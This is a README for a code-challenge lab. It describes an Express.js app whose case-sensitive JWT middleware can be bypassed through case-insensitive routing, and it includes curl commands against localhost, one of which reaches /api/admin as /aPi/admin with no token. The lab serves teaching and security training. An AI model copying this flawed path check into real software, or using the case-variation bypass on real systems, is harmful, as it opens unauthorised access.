# day 4 javascript
We have a small javascript application that developed by expressjs framework. ExpressJS routing provide case-insensitive routing by default.
But our team developed a middleware for validation of JWT tokens with `startsWith` function that are working case-sensitive by default.

# build & run
```bash
git clone https://github.com/ahmetak4n/sonarsource-code-challanges.git
cd sonarsource-code-challanges/day4
npm install
node app.js
```

# verify the vulnerability
You can't access `/api/admin` path because we don't have any valid JWT token
``` bash
curl  -X $'GET' \
    -H $'Host: localhost:1337' -H $'Upgrade-Insecure-Requests: 1' -H $'Connection: keep-alive' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36' \
    $'http://localhost:1337/api/admin'
```
----
You can bypass the token validation with following way
```bash
curl  -X $'GET' \
    -H $'Host: localhost:1337' -H $'Upgrade-Insecure-Requests: 1' -H $'Connection: keep-alive' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36' \
    $'http://localhost:1337/aPi/admin'
```
